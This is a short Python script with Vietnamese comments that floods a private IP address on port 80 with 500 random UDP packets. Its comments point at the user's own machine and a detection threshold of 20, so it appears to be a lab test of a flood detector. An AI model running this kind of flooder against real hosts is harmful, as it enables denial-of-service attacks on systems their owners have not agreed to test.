import socket
import time
import random

# IP Wi-Fi của máy bạn (Lấy từ ipconfig của bạn)
TARGET_IP = "10.10.58.159"
TARGET_PORT = 80
PACKET_COUNT = 500  # Gửi 500 gói (dư sức vượt ngưỡng 20)


def flood():
    print(f"Dang tan cong Flood vao {TARGET_IP}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP Packet
    payload = random._urandom(1024)  # Gói tin rác

    for i in range(PACKET_COUNT):
        try:
            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
            # Gửi cực nhanh, không delay
        except Exception as e:
            print(f"Loi: {e}")
            break

    sock.close()
    print(f"Da gui xong {PACKET_COUNT} goi tin!")


if __name__ == "__main__":
    flood()